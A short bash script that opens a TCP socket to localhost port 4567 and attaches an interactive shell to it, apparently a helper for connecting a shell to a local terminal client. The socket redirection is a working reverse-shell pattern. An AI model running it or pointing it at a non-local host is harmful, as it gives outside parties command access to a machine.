#!/usr/bin/env bash
exec 3<>/dev/tcp/127.0.0.1/4567
cd ~
unbuffer -p sh -c 'stty echo -onlcr cols 80 rows 25;sh' <&3 1>&3 2>&3
